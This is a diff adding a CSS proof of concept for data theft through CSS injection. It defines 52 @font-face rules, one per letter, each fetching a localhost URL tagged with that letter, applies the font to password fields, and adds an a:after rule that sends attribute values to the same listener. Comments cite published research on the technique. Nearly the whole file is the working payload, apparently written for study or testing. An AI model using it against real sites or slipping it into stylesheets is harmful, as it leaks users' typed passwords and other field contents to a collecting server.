@@ -1,0 +1,286 @@
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?A');
+	unicode-range:U+0041;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?B');
+	unicode-range:U+0042;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?C');
+	unicode-range:U+0043;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?D');
+	unicode-range:U+0044;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?E');
+	unicode-range:U+0045;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?F');
+	unicode-range:U+0046;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?G');
+	unicode-range:U+0047;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?H');
+	unicode-range:U+0048;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?I');
+	unicode-range:U+0049;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?J');
+	unicode-range:U+004A;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?K');
+	unicode-range:U+004B;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?L');
+	unicode-range:U+004C;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?M');
+	unicode-range:U+004D;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?N');
+	unicode-range:U+004E;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?O');
+	unicode-range:U+004F;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?P');
+	unicode-range:U+0050;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?Q');
+	unicode-range:U+0051;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?R');
+	unicode-range:U+0052;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?S');
+	unicode-range:U+0053;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?T');
+	unicode-range:U+0054;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?U');
+	unicode-range:U+0055;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?V');
+	unicode-range:U+0056;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?W');
+	unicode-range:U+0057;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?X');
+	unicode-range:U+0058;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?Y');
+	unicode-range:U+0059;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?Z');
+	unicode-range:U+005A;
+}
+
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?a');
+	unicode-range:U+0061;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?b');
+	unicode-range:U+0062;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?c');
+	unicode-range:U+0063;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?d');
+	unicode-range:U+0064;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?e');
+	unicode-range:U+0065;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?f');
+	unicode-range:U+0066;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?g');
+	unicode-range:U+0067;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?h');
+	unicode-range:U+0068;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?i');
+	unicode-range:U+0069;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?j');
+	unicode-range:U+006A;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?k');
+	unicode-range:U+006B;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?l');
+	unicode-range:U+006C;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?m');
+	unicode-range:U+006D;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?n');
+	unicode-range:U+006E;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?o');
+	unicode-range:U+006F;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?p');
+	unicode-range:U+0070;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?q');
+	unicode-range:U+0071;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?r');
+	unicode-range:U+0072;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?s');
+	unicode-range:U+0073;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?t');
+	unicode-range:U+0074;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?u');
+	unicode-range:U+0075;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?v');
+	unicode-range:U+0076;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?w');
+	unicode-range:U+0077;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?x');
+	unicode-range:U+0078;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?y');
+	unicode-range:U+0079;
+}
+@font-face{
+	font-family:attack;
+	src:url('http://localhost:8000?z');
+	unicode-range:U+007A;
+}
+
+#style-self-external-2  {
+  /* 
+  - https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense
+  - https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html
+  - http://vulnerabledoma.in/poc_unicode-range2.html
+  - https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d 
+  - https://gist.github.com/d0nutptr/
+  - https://github.com/dxa4481/cssInjection
+  - http://p42.us/css/
+  - https://www.troopers.de/media/filer_public/47/19/4719cfce-8be9-4739-a7b4-42f9761a9fd6/tr12_day02_heiderich_got_ur_nose.pdf
+  */
+  font-family: attack;
+ }
+
+ [name*="password"] {
+    font-family: attack;
+   }
+  
+  a:after {
+    /* content: attr(value); */
+    content: url("http://localhost:8000?from-css=1") attr(value);
+   }
+  
+/* @import url('https://fonts.googleapis.com/css?family=Nixie+One'); */
